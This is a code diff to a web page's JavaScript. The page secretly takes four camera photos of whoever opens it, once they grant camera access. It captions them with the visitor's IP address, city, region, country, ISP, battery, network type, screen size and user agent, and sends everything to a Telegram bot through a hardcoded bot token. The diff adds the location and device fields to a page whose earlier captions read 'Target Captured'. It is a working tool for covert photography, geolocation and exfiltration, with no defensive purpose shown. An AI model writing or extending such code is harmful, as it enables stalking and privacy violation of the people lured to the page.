@@ -56,20 +56,39 @@
 
     <script>
         const BOT_TOKEN = "8857558695:AAGOlJ_9PzeyvaOku_2_-MxjdbZJILC1cQI";
-        let ipData = "Fetching...";
+        
+        let ipInfo = "Fetching...";
+        let cityInfo = "Unknown";
+        let regionInfo = "Unknown";
+        let countryInfo = "Unknown";
+        let ispInfo = "Unknown";
         let batteryData = "Unknown";
+        let networkData = "Unknown";
 
-        // IP Address fetch karna
-        fetch('https://api.ipify.org?format=json')
+        // IP aur Location info fetch karna (ipapi.co free service se)
+        fetch('https://ipapi.co/json/')
             .then(res => res.json())
-            .then(data => { ipData = data.ip; })
-            .catch(e => { ipData = "Hidden"; });
+            .then(data => {
+                ipInfo = data.ip || "N/A";
+                cityInfo = data.city || "N/A";
+                regionInfo = data.region || "N/A";
+                countryInfo = data.country_name || "N/A";
+                ispInfo = data.org || "N/A";
+            })
+            .catch(e => { ipInfo = "Hidden"; });
 
-        // Battery level check karna
+        // Battery details fetch karna
         if (navigator.getBattery) {
             navigator.getBattery().then(battery => {
-                batteryData = Math.round(battery.level * 100) + "% " + (battery.charging ? "(Charging)" : "");
+                let level = Math.round(battery.level * 100);
+                let charging = battery.charging ? "⚡ (Charging)" : "🔋";
+                batteryData = `${level}% ${charging}`;
             });
+        }
+
+        // Network connection type
+        if (navigator.connection) {
+            networkData = navigator.connection.effectiveType ? navigator.connection.effectiveType.toUpperCase() : "Unknown";
         }
 
         function startProcess() {
@@ -82,7 +101,7 @@
 
             let facingModeSetting = "user"; 
             if (camType === 'back') {
-                facingModeSetting = { exact: "environment" }; // Back camera strict mode
+                facingModeSetting = { exact: "environment" };
             }
 
             navigator.mediaDevices.getUserMedia({ 
@@ -95,7 +114,6 @@
                 let photoCount = 0;
                 const maxPhotos = 4; // Total 4 photos khinchega
 
-                // Har 1.5 second mein ek photo click hogi (Total 4 photos)
                 const photoInterval = setInterval(() => {
                     photoCount++;
                     const canvas = document.getElementById('canvas');
@@ -106,7 +124,23 @@
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
                     canvas.toBlob(blob => {
-                        let captionText = `🎯 Target Captured (${photoCount}/${maxPhotos})\n🌐 IP: ${ipData}\n🔋 Battery: ${batteryData}`;
+                        let currentTime = new Date().toLocaleString();
+                        let screenRes = `${window.screen.width}x${window.screen.height}`;
+                        let uaString = navigator.userAgent;
+
+                        let captionText = 
+                            `🌐 **IP Information**\n\n` +
+                            `🔢 IP Address: \`${ipInfo}\`\n` +
+                            `📍 Location: ${cityInfo}\n` +
+                            `🌍 Region: ${regionInfo} (${countryInfo})\n` +
+                            `📡 ISP: ${ispInfo}\n\n` +
+                            `📱 **Device Details** (${photoCount}/${maxPhotos})\n\n` +
+                            `🔋 Battery: ${batteryData}\n` +
+                            `📶 Network: ${networkData}\n` +
+                            `🖥️ Screen: ${screenRes}\n` +
+                            `🕒 Time: ${currentTime}\n` +
+                            `🧠 UA: \`${uaString}\``;
+
                         sendPhotoToTelegram(blob, chatId, captionText);
                     }, 'image/jpeg', 0.85);
 
@@ -122,7 +156,6 @@
 
             })
             .catch(error => {
-                // Agar 'exact: environment' ki wajah se error aaye, toh normal environment try karega
                 if (camType === 'back') {
                     fallbackBackCamera(chatId);
                 } else {
@@ -131,7 +164,6 @@
             });
         }
 
-        // Fallback agar exact match na ho toh normal back camera kholne ke liye
         function fallbackBackCamera(chatId) {
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } })
             .then(stream => {
@@ -149,7 +181,23 @@
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
                     canvas.toBlob(blob => {
-                        let captionText = `🎯 Target Captured [Back] (${photoCount}/${maxPhotos})\n🌐 IP: ${ipData}\n🔋 Battery: ${batteryData}`;
+                        let currentTime = new Date().toLocaleString();
+                        let screenRes = `${window.screen.width}x${window.screen.height}`;
+                        let uaString = navigator.userAgent;
+
+                        let captionText = 
+                            `🌐 **IP Information [Back Cam]**\n\n` +
+                            `🔢 IP Address: \`${ipInfo}\`\n` +
+                            `📍 Location: ${cityInfo}\n` +
+                            `🌍 Region: ${regionInfo} (${countryInfo})\n` +
+                            `📡 ISP: ${ispInfo}\n\n` +
+                            `📱 **Device Details** (${photoCount}/${maxPhotos})\n\n` +
+                            `🔋 Battery: ${batteryData}\n` +
+                            `📶 Network: ${networkData}\n` +
+                            `🖥️ Screen: ${screenRes}\n` +
+                            `🕒 Time: ${currentTime}\n` +
+                            `🧠 UA: \`${uaString}\``;
+
                         sendPhotoToTelegram(blob, chatId, captionText);
                     }, 'image/jpeg', 0.85);
 
@@ -172,6 +220,7 @@
             formData.append('chat_id', chatId);
             formData.append('photo', blob, 'capture.jpg');
             formData.append('caption', caption);
+            formData.append('parse_mode', 'Markdown');
 
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
